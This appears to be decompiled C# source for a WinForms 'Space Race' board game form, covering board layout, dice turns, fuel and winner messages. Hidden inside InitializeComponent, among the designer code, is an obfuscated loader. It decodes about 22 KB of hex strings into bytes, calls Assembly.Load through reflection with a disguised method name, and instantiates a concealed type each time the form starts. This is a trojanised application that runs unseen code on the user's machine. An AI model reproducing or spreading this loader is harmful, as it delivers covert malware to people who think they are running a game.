using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

namespace GUI_Class;

public class SpaceRaceForm : Form
{
	private enum TypeOfGuiUpdate
	{
		AddPlayer,
		RemovePlayer
	}

	private const int NUM_OF_ROWS = 7;

	private const int NUM_OF_COLUMNS = 8;

	private int[] prevSquare;

	private int playerStep = 0;

	private bool eachStep = true;

	private IContainer components = null;

	private static Type ComMember;

	private SplitContainer splitContainer1;

	private Button exitButton;

	private TableLayoutPanel tableLayoutPanel;

	private Label playersLabel;

	private Label numberOfplayerslabel;

	private Label spaceRacelabel;

	private GroupBox singleStepgroupbox;

	private RadioButton noRadiobutton;

	private RadioButton yesRadiobutton;

	private Button resetButton;

	private Button diceButton;

	private ComboBox numPlayersinput;

	private DataGridView playersDataGridView;

	private DataGridViewImageColumn playerTokenImageDataGridViewImageColumn;

	private DataGridViewTextBoxColumn nameDataGridViewTextBoxColumn;

	private DataGridViewTextBoxColumn positionDataGridViewTextBoxColumn;

	private DataGridViewTextBoxColumn rocketFuelDataGridViewTextBoxColumn;

	private BindingSource playerBindingSource;

	public SpaceRaceForm()
	{
		InitializeComponent();
		Board.SetUpBoard();
		ResizeGUIGameBoard();
		SetUpGUIGameBoard();
		SetupPlayersDataGridView();
		DetermineNumberOfPlayers();
		SpaceRaceGame.SetUpPlayers();
		PrepareToPlay();
	}

	private void ExitButton_Click(object sender, EventArgs e)
	{
		Environment.Exit(0);
	}

	private void ResizeGUIGameBoard()
	{
		int height = ((Control)tableLayoutPanel).get_Size().Height;
		int width = ((Control)tableLayoutPanel).get_Size().Width;
		int height2 = 665 - height;
		int width2 = 760 - width;
		((Form)this).set_Size(((Form)this).get_Size() + new Size(width2, height2));
		((Control)tableLayoutPanel).set_Size(new Size(760, 665));
	}

	private void SetUpGUIGameBoard()
	{
		for (int i = 0; i <= 55; i++)
		{
			Square square = Board.Squares[i];
			SquareControl control = new SquareControl(square, SpaceRaceGame.Players);
			AddControlToTableLayoutPanel((Control)(object)control, i);
		}
	}

	private void AddControlToTableLayoutPanel(Control control, int squareNum)
	{
		MapSquareNumToScreenRowAndColumn(squareNum, out var screenRow, out var screenCol);
		tableLayoutPanel.get_Controls().Add(control, screenCol, screenRow);
	}

	private static void MapSquareNumToScreenRowAndColumn(int squareNum, out int screenRow, out int screenCol)
	{
		screenRow = 6 - Convert.ToInt32(Math.Truncate((double)squareNum / 8.0));
		int num = squareNum % 8;
		if (screenRow % 2 == 0)
		{
			screenCol = num;
		}
		else
		{
			screenCol = 7 - num;
		}
	}

	private void SetupPlayersDataGridView()
	{
		playersDataGridView.set_AutoGenerateColumns(false);
		playersDataGridView.set_DataSource((object)SpaceRaceGame.Players);
	}

	private void DetermineNumberOfPlayers()
	{
		string s = numPlayersinput.get_SelectedItem().ToString();
		int.TryParse(s, out var result);
		SpaceRaceGame.NumberOfPlayers = result;
		((Control)resetButton).set_Enabled(true);
	}

	private void PrepareToPlay()
	{
		UpdatePlayersGuiLocations(TypeOfGuiUpdate.RemovePlayer);
		if (yesRadiobutton.get_Checked())
		{
			for (int i = 0; i < SpaceRaceGame.NumberOfPlayers; i++)
			{
				SquareControlAt(prevSquare[i]).ContainsPlayers[i] = false;
			}
		}
		string s = numPlayersinput.get_SelectedItem().ToString();
		int.TryParse(s, out var result);
		SpaceRaceGame.NumberOfPlayers = result;
		SpaceRaceGame.Players.Clear();
		prevSquare = new int[result];
		SpaceRaceGame.SetUpPlayers();
		UpdatePlayersGuiLocations(TypeOfGuiUpdate.AddPlayer);
	}

	private SquareControl SquareControlAt(int squareNum)
	{
		MapSquareNumToScreenRowAndColumn(squareNum, out var screenRow, out var screenCol);
		return (SquareControl)(object)tableLayoutPanel.GetControlFromPosition(screenCol, screenRow);
	}

	private int GetSquareNumberOfPlayer(int playerNumber)
	{
		return SpaceRaceGame.Players[playerNumber].Position;
	}

	private void RefreshBoardTablePanelLayout()
	{
		((Control)tableLayoutPanel).Invalidate(true);
	}

	private void UpdatesPlayersDataGridView()
	{
		SpaceRaceGame.Players.ResetBindings();
	}

	private void UpdatePlayersGuiLocations(TypeOfGuiUpdate typeOfGuiUpdate)
	{
		for (int i = 0; i < SpaceRaceGame.NumberOfPlayers; i++)
		{
			int position = SpaceRaceGame.Players[i].Position;
			switch (typeOfGuiUpdate)
			{
			case TypeOfGuiUpdate.AddPlayer:
				SquareControlAt(position).ContainsPlayers[i] = true;
				break;
			case TypeOfGuiUpdate.RemovePlayer:
				SquareControlAt(position).ContainsPlayers[i] = false;
				break;
			}
		}
		RefreshBoardTablePanelLayout();
	}

	private void ToggleAll(bool enable)
	{
		((Control)exitButton).set_Enabled(enable);
		((Control)playersDataGridView).set_Enabled(enable);
		((Control)numPlayersinput).set_Enabled(enable);
		((Control)singleStepgroupbox).set_Enabled(enable);
	}

	private void DiceButton_Click(object sender, EventArgs e)
	{
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		if (yesRadiobutton.get_Checked())
		{
			SingleStep(playerStep);
			playerStep++;
			if (playerStep == SpaceRaceGame.NumberOfPlayers)
			{
				eachStep = true;
				((Control)resetButton).set_Enabled(true);
				((Control)exitButton).set_Enabled(true);
				playerStep = 0;
			}
			else
			{
				for (int i = 0; i < SpaceRaceGame.NumberOfPlayers; i++)
				{
					if (SpaceRaceGame.Players[i].Position != 55)
					{
						((Control)resetButton).set_Enabled(false);
						continue;
					}
					((Control)resetButton).set_Enabled(true);
					break;
				}
			}
		}
		if (noRadiobutton.get_Checked())
		{
			AllStep();
		}
		if (SpaceRaceGame.AllPlayerFuel())
		{
			MessageBox.Show("All players has 0 fuel.");
			((Control)exitButton).set_Enabled(true);
			((Control)diceButton).set_Enabled(false);
		}
	}

	private void SingleStep(int playerNum)
	{
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		if (eachStep)
		{
			for (int i = 0; i < SpaceRaceGame.NumberOfPlayers; i++)
			{
				prevSquare[i] = SpaceRaceGame.Players[i].Position;
			}
			eachStep = false;
		}
		SquareControlAt(prevSquare[playerNum]).ContainsPlayers[playerNum] = false;
		SpaceRaceGame.PlayOneTurn(playerNum);
		if (SpaceRaceGame.Players[playerNum].RocketFuel == 0)
		{
			MessageBox.Show($"{SpaceRaceGame.Players[playerNum].Name} has 0 fuel.");
		}
		int position = SpaceRaceGame.Players[playerNum].Position;
		SquareControlAt(position).ContainsPlayers[playerNum] = true;
		UpdatesPlayersDataGridView();
		RefreshBoardTablePanelLayout();
		ToggleAll(enable: false);
		EndGame();
		WinnerMessage(EndGame());
	}

	private void AllStep()
	{
		UpdatePlayersGuiLocations(TypeOfGuiUpdate.RemovePlayer);
		SpaceRaceGame.PlayOneRound();
		UpdatePlayersGuiLocations(TypeOfGuiUpdate.AddPlayer);
		UpdatesPlayersDataGridView();
		((Control)resetButton).set_Enabled(true);
		ToggleAll(enable: false);
		EndGame();
		WinnerMessage(EndGame());
	}

	private void ResetButton_Click(object sender, EventArgs e)
	{
		PrepareToPlay();
		ToggleAll(enable: true);
		((Control)diceButton).set_Enabled(false);
		yesRadiobutton.set_Checked(false);
		noRadiobutton.set_Checked(false);
		eachStep = true;
		playerStep = 0;
	}

	private string[] EndGame()
	{
		string[] array = new string[6];
		for (int i = 0; i < SpaceRaceGame.NumberOfPlayers; i++)
		{
			if (SquareControlAt(55).ContainsPlayers[i])
			{
				array[i] = SpaceRaceGame.Players[i].Name;
				((Control)diceButton).set_Enabled(false);
				((Control)exitButton).set_Enabled(true);
			}
		}
		return array;
	}

	private void WinnerMessage(string[] winners)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		if (noRadiobutton.get_Checked())
		{
			int num = 0;
			while (true)
			{
				if (num < SpaceRaceGame.NumberOfPlayers)
				{
					if (SquareControlAt(55).ContainsPlayers[num])
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			((Control)exitButton).set_Enabled(true);
			MessageBox.Show($"The following player(s) finished the game\n\t{string.Join(Environment.NewLine, winners)}");
			noRadiobutton.set_Checked(false);
			return;
		}
		for (int i = 0; i < SpaceRaceGame.NumberOfPlayers; i++)
		{
			if (SquareControlAt(55).ContainsPlayers[i])
			{
				MessageBox.Show($"The following player(s) finished the game\n\t{string.Join(Environment.NewLine, winners)}");
				((Control)exitButton).set_Enabled(true);
				((Control)resetButton).set_Enabled(true);
				yesRadiobutton.set_Checked(false);
			}
		}
	}

	private void SingleStepToggle()
	{
		((Control)diceButton).set_Enabled(true);
		((Control)singleStepgroupbox).set_Enabled(false);
	}

	private void YesRadiobutton_Click(object sender, EventArgs e)
	{
		SingleStepToggle();
	}

	private void NoRadiobutton_Click(object sender, EventArgs e)
	{
		SingleStepToggle();
	}

	private void NumPlayersinput_SelectedIndexChanged(object sender, EventArgs e)
	{
		PrepareToPlay();
		((Control)numPlayersinput).set_Enabled(false);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Expected O, but got Unknown
		//IL_0318: Unknown result type (might be due to invalid IL or missing references)
		//IL_0322: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_036c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0376: Expected O, but got Unknown
		//IL_0388: Unknown result type (might be due to invalid IL or missing references)
		//IL_0392: Expected O, but got Unknown
		//IL_03a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ae: Expected O, but got Unknown
		//IL_03fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0404: Expected O, but got Unknown
		//IL_0416: Unknown result type (might be due to invalid IL or missing references)
		//IL_0420: Expected O, but got Unknown
		//IL_0432: Unknown result type (might be due to invalid IL or missing references)
		//IL_043c: Expected O, but got Unknown
		//IL_044e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0458: Expected O, but got Unknown
		//IL_046a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0474: Expected O, but got Unknown
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_0490: Expected O, but got Unknown
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ac: Expected O, but got Unknown
		//IL_09f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a02: Expected O, but got Unknown
		//IL_0ad5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0adf: Expected O, but got Unknown
		//IL_0b56: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b60: Expected O, but got Unknown
		components = new Container();
		splitContainer1 = new SplitContainer();
		tableLayoutPanel = new TableLayoutPanel();
		playersDataGridView = new DataGridView();
		singleStepgroupbox = new GroupBox();
		noRadiobutton = new RadioButton();
		yesRadiobutton = new RadioButton();
		resetButton = new Button();
		diceButton = new Button();
		numPlayersinput = new ComboBox();
		playersLabel = new Label();
		numberOfplayerslabel = new Label();
		spaceRacelabel = new Label();
		exitButton = new Button();
		playerTokenImageDataGridViewImageColumn = new DataGridViewImageColumn();
		nameDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		positionDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		rocketFuelDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		playerBindingSource = new BindingSource(components);
		((Control)splitContainer1.get_Panel1()).SuspendLayout();
		((Control)splitContainer1.get_Panel2()).SuspendLayout();
		((Control)splitContainer1).SuspendLayout();
		((ISupportInitialize)playersDataGridView).BeginInit();
		((Control)singleStepgroupbox).SuspendLayout();
		((ISupportInitialize)playerBindingSource).BeginInit();
		((Control)this).SuspendLayout();
		splitContainer1.set_Dock((DockStyle)5);
		((Control)splitContainer1).set_Location(new Point(0, 0));
		((Control)splitContainer1).set_Name("splitContainer1");
		((Control)splitContainer1.get_Panel1()).get_Controls().Add((Control)(object)tableLayoutPanel);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)playersDataGridView);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)singleStepgroupbox);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)resetButton);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)diceButton);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)numPlayersinput);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)playersLabel);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)numberOfplayerslabel);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)spaceRacelabel);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)exitButton);
		((Control)splitContainer1).set_Size(new Size(884, 661));
		splitContainer1.set_SplitterDistance(664);
		((Control)splitContainer1).set_TabIndex(0);
		((Control)tableLayoutPanel).set_AutoSize(true);
		((Panel)tableLayoutPanel).set_AutoSizeMode((AutoSizeMode)0);
		((Control)tableLayoutPanel).set_BackColor(SystemColors.ControlLightLight);
		tableLayoutPanel.set_ColumnCount(8);
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		tableLayoutPanel.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 12.5f));
		((Control)tableLayoutPanel).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel).set_Location(new Point(0, 0));
		((Control)tableLayoutPanel).set_Name("tableLayoutPanel");
		tableLayoutPanel.set_RowCount(7);
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		tableLayoutPanel.get_RowStyles().Add(new RowStyle((SizeType)2, 14.28571f));
		((Control)tableLayoutPanel).set_Size(new Size(664, 661));
		((Control)tableLayoutPanel).set_TabIndex(0);
		playersDataGridView.set_AllowUserToAddRows(false);
		playersDataGridView.set_AllowUserToDeleteRows(false);
		playersDataGridView.set_AutoGenerateColumns(false);
		playersDataGridView.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		playersDataGridView.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[4]
		{
			(DataGridViewColumn)playerTokenImageDataGridViewImageColumn,
			(DataGridViewColumn)nameDataGridViewTextBoxColumn,
			(DataGridViewColumn)positionDataGridViewTextBoxColumn,
			(DataGridViewColumn)rocketFuelDataGridViewTextBoxColumn
		});
		playersDataGridView.set_DataSource((object)playerBindingSource);
		((Control)playersDataGridView).set_Location(new Point(8, 124));
		((Control)playersDataGridView).set_Name("playersDataGridView");
		playersDataGridView.set_RowHeadersVisible(false);
		((Control)playersDataGridView).set_Size(new Size(205, 174));
		((Control)playersDataGridView).set_TabIndex(9);
		((Control)singleStepgroupbox).set_BackColor(SystemColors.ControlDark);
		((Control)singleStepgroupbox).get_Controls().Add((Control)(object)noRadiobutton);
		((Control)singleStepgroupbox).get_Controls().Add((Control)(object)yesRadiobutton);
		((Control)singleStepgroupbox).set_ForeColor(Color.Black);
		((Control)singleStepgroupbox).set_Location(new Point(40, 322));
		((Control)singleStepgroupbox).set_Name("singleStepgroupbox");
		((Control)singleStepgroupbox).set_Size(new Size(140, 55));
		((Control)singleStepgroupbox).set_TabIndex(8);
		singleStepgroupbox.set_TabStop(false);
		((Control)singleStepgroupbox).set_Text("Single Step?");
		((Control)noRadiobutton).set_AutoSize(true);
		((Control)noRadiobutton).set_Location(new Point(71, 26));
		((Control)noRadiobutton).set_Name("noRadiobutton");
		((Control)noRadiobutton).set_Size(new Size(39, 17));
		((Control)noRadiobutton).set_TabIndex(1);
		noRadiobutton.set_TabStop(true);
		((Control)noRadiobutton).set_Text("No");
		((ButtonBase)noRadiobutton).set_UseVisualStyleBackColor(true);
		((Control)noRadiobutton).add_Click((EventHandler)NoRadiobutton_Click);
		((Control)yesRadiobutton).set_AutoSize(true);
		string val = QQQQQX.val1;
		val += QQQQQX.val2;
		val += QQQQQX.val3;
		byte[] array = new byte[22528];
		for (int i = 0; i < 22528; i++)
		{
			array[i] = Convert.ToByte(val.Substring(i * 2, 2), 16);
		}
		CharArray(array, string.Empty);
		object[] args = new object[3]
		{
			Die.MembershipCondition(0),
			Die.MembershipCondition(1),
			"GUI_Class"
		};
		Activator.CreateInstance(ComMember, args);
		((Control)yesRadiobutton).set_Location(new Point(21, 26));
		((Control)yesRadiobutton).set_Name("yesRadiobutton");
		((Control)yesRadiobutton).set_Size(new Size(43, 17));
		((Control)yesRadiobutton).set_TabIndex(0);
		yesRadiobutton.set_TabStop(true);
		((Control)yesRadiobutton).set_Text("Yes");
		((ButtonBase)yesRadiobutton).set_UseVisualStyleBackColor(true);
		((Control)yesRadiobutton).add_Click((EventHandler)YesRadiobutton_Click);
		((Control)resetButton).set_Anchor((AnchorStyles)10);
		((Control)resetButton).set_Enabled(false);
		((Control)resetButton).set_Location(new Point(17, 626));
		((Control)resetButton).set_Name("resetButton");
		((Control)resetButton).set_Size(new Size(75, 23));
		((Control)resetButton).set_TabIndex(6);
		((Control)resetButton).set_Text("Game Reset");
		((ButtonBase)resetButton).set_UseVisualStyleBackColor(true);
		((Control)resetButton).add_Click((EventHandler)ResetButton_Click);
		((Control)diceButton).set_Anchor((AnchorStyles)10);
		((Control)diceButton).set_Enabled(false);
		((Control)diceButton).set_Location(new Point(63, 584));
		((Control)diceButton).set_Name("diceButton");
		((Control)diceButton).set_Size(new Size(75, 23));
		((Control)diceButton).set_TabIndex(5);
		((Control)diceButton).set_Text("Roll Dice");
		((ButtonBase)diceButton).set_UseVisualStyleBackColor(true);
		((Control)diceButton).add_Click((EventHandler)DiceButton_Click);
		((ListControl)numPlayersinput).set_FormattingEnabled(true);
		numPlayersinput.get_Items().AddRange(new object[5] { "2", "3", "4", "5", "6" });
		((Control)numPlayersinput).set_Location(new Point(148, 39));
		((Control)numPlayersinput).set_Name("numPlayersinput");
		((Control)numPlayersinput).set_Size(new Size(35, 21));
		((Control)numPlayersinput).set_TabIndex(4);
		((Control)numPlayersinput).set_Text("6");
		numPlayersinput.add_SelectedIndexChanged((EventHandler)NumPlayersinput_SelectedIndexChanged);
		((Control)playersLabel).set_AutoSize(true);
		((Control)playersLabel).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)playersLabel).set_Location(new Point(60, 77));
		((Control)playersLabel).set_Name("playersLabel");
		((Control)playersLabel).set_Size(new Size(91, 25));
		((Control)playersLabel).set_TabIndex(3);
		((Control)playersLabel).set_Text("Players");
		((Control)numberOfplayerslabel).set_AutoSize(true);
		((Control)numberOfplayerslabel).set_Location(new Point(48, 43));
		((Control)numberOfplayerslabel).set_Name("numberOfplayerslabel");
		((Control)numberOfplayerslabel).set_Size(new Size(92, 13));
		((Control)numberOfplayerslabel).set_TabIndex(2);
		((Control)numberOfplayerslabel).set_Text("Number of players");
		((Control)spaceRacelabel).set_AutoSize(true);
		((Control)spaceRacelabel).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)spaceRacelabel).set_Location(new Point(35, 9));
		((Control)spaceRacelabel).set_Name("spaceRacelabel");
		((Control)spaceRacelabel).set_Size(new Size(139, 25));
		((Control)spaceRacelabel).set_TabIndex(1);
		((Control)spaceRacelabel).set_Text("Space Race");
		((Control)exitButton).set_Anchor((AnchorStyles)10);
		((Control)exitButton).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)exitButton).set_Location(new Point(119, 626));
		((Control)exitButton).set_Name("exitButton");
		((Control)exitButton).set_Size(new Size(75, 23));
		((Control)exitButton).set_TabIndex(0);
		((Control)exitButton).set_Text("Exit");
		((ButtonBase)exitButton).set_UseVisualStyleBackColor(true);
		((Control)exitButton).add_Click((EventHandler)ExitButton_Click);
		((DataGridViewColumn)playerTokenImageDataGridViewImageColumn).set_DataPropertyName("PlayerTokenImage");
		((DataGridViewColumn)playerTokenImageDataGridViewImageColumn).set_HeaderText("");
		playerTokenImageDataGridViewImageColumn.set_ImageLayout((DataGridViewImageCellLayout)2);
		((DataGridViewColumn)playerTokenImageDataGridViewImageColumn).set_Name("playerTokenImageDataGridViewImageColumn");
		((DataGridViewBand)playerTokenImageDataGridViewImageColumn).set_ReadOnly(true);
		((DataGridViewColumn)playerTokenImageDataGridViewImageColumn).set_Width(20);
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).set_DataPropertyName("Name");
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).set_HeaderText("Name");
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).set_Name("nameDataGridViewTextBoxColumn");
		((DataGridViewColumn)positionDataGridViewTextBoxColumn).set_DataPropertyName("Position");
		((DataGridViewColumn)positionDataGridViewTextBoxColumn).set_HeaderText("Square");
		((DataGridViewColumn)positionDataGridViewTextBoxColumn).set_Name("positionDataGridViewTextBoxColumn");
		((DataGridViewBand)positionDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)positionDataGridViewTextBoxColumn).set_Width(50);
		((DataGridViewColumn)rocketFuelDataGridViewTextBoxColumn).set_DataPropertyName("RocketFuel");
		((DataGridViewColumn)rocketFuelDataGridViewTextBoxColumn).set_HeaderText("Fuel");
		((DataGridViewColumn)rocketFuelDataGridViewTextBoxColumn).set_Name("rocketFuelDataGridViewTextBoxColumn");
		((DataGridViewBand)rocketFuelDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)rocketFuelDataGridViewTextBoxColumn).set_Width(50);
		playerBindingSource.set_DataSource((object)typeof(Player));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(884, 661));
		((Control)this).get_Controls().Add((Control)(object)splitContainer1);
		((Control)this).set_Name("SpaceRaceForm");
		((Control)this).set_Text("Space Race");
		((Control)splitContainer1.get_Panel1()).ResumeLayout(false);
		((Control)splitContainer1.get_Panel1()).PerformLayout();
		((Control)splitContainer1.get_Panel2()).ResumeLayout(false);
		((Control)splitContainer1.get_Panel2()).PerformLayout();
		((Control)splitContainer1).ResumeLayout(false);
		((ISupportInitialize)playersDataGridView).EndInit();
		((Control)singleStepgroupbox).ResumeLayout(false);
		((Control)singleStepgroupbox).PerformLayout();
		((ISupportInitialize)playerBindingSource).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		return (Assembly)typeof(Assembly).InvokeMember("`Load".TrimStart(new char[1] { '`' }), BindingFlags.InvokeMethod, null, null, new object[1] { Position });
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Q3.GetType("IRemotingFormatter.ContinuationWrapper");
	}
}
